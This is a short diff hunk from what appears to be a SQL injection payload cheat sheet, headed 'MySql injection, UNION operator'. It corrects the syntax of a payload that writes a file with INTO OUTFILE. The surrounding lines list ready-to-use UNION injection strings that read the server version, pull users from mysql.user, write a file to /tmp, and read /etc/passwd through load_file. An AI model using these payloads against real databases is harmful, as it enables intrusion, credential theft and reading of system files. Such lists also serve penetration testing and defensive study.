@@ -70,7 +70,7 @@ MySql injection, UNION operator
     Other payloads:
     *-1 union all select @@version --
 1 union SELECT user FROM mysql.user
-1 union select 'foo' into outfile('/tmp/foo')
+1 union select 'foo' into outfile '/tmp/foo'
 1 union select load_file('/etc/passwd')*
 
 Leak database
